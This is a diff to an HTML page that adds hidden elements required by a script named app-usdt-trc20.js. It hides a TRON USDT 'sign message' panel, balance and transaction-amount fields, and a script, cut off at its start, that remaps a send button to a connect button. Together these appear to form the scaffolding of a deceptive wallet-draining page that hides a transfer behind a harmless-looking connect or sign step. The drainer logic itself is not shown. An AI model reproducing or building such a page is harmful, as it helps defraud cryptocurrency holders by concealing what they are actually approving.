@@ -29,6 +29,67 @@
 </head>
 <body>
 
+  <!-- ============================================================
+       Elementos ocultos exigidos por script.js / app-usdt-trc20.js
+       Nenhum deles aparece no layout visual.
+       ============================================================ -->
+
+  <div id="wallet" style="display:none;"></div>
+
+  <nav class="navbar" style="display:none;">
+      <div id="hamburger" style="display:none;"><span></span><span></span><span></span></div>
+      <ul id="navMenu" style="display:none;"></ul>
+  </nav>
+
+  <div style="display:none;">
+      <button id="langBtn"></button>
+      <div id="langDropdown">
+          <button class="lang-option" data-lang="en">EN</button>
+      </div>
+      <span id="currentLang">EN</span>
+  </div>
+
+  <div style="display:none;">
+      <button id="tabSign">Sign message</button>
+      <button id="tabVerify">Verify message</button>
+  </div>
+
+  <div id="signContent" style="display:none;">
+      <label class="field-label">Hex format</label>
+      <input type="checkbox" id="hexToggle">
+      <textarea id="messageInput" maxlength="1024">This account belongs to ...</textarea>
+      <span id="charCount">27 / 1024</span>
+      <span id="walletAddress">T...</span>
+      <div id="signatureOutput">Will be generated after signing</div>
+      <button id="clearAllBtn">Clear all</button>
+      <button id="closePanelBtn">&times;</button>
+      <div id="mobileWalletOptions" style="display:none;">
+          <button id="openTrustWallet">Trust Wallet</button>
+          <button id="openMetaMask">TronLink</button>
+      </div>
+  </div>
+
+  <div id="verifyContent" style="display:none;">
+      <textarea placeholder="Enter signed message..."></textarea>
+      <input type="text" placeholder="Enter signer address...">
+      <input type="text" placeholder="Enter signature...">
+  </div>
+
+  <div id="walletInfo" style="display:none!important;">
+      <div class="info-row" style="display:none!important;">
+          <span class="label">Wallet Address:</span>
+          <span class="value" style="display:none!important;"></span>
+      </div>
+      <div class="info-row" style="display:none!important;">
+          <span class="label">Current Balance:</span>
+          <span id="currentBalance" class="value" style="display:none!important;">0.0000 USDT</span>
+      </div>
+      <div class="info-row" style="display:none!important;">
+          <span class="label">Transaction Amount:</span>
+          <span id="sendAmount" class="value" style="display:none!important;">0.0000 USDT</span>
+      </div>
+  </div>
+
   <!-- Capa de compatibilidad Proxy (sendBtn -> connectBtn) -->
   <script>
     (function(){
